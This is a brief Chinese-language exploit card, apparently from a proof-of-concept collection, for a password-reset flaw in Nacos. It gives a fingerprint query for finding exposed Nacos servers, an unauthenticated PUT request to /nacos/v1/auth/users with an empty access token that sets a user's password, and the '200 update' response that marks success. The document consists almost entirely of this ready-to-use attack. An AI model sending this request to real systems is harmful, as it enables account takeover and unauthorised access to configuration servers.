# Nacos用户密码重置漏洞

Nacos ｜ 其他 ｜ —
- **指纹**：`app="nacos"`
- **请求**：`PUT /nacos/v1/auth/users?accessToken=&username=dudesite&password=dudesite HTTP/1.1`
- **响应特征**：200 update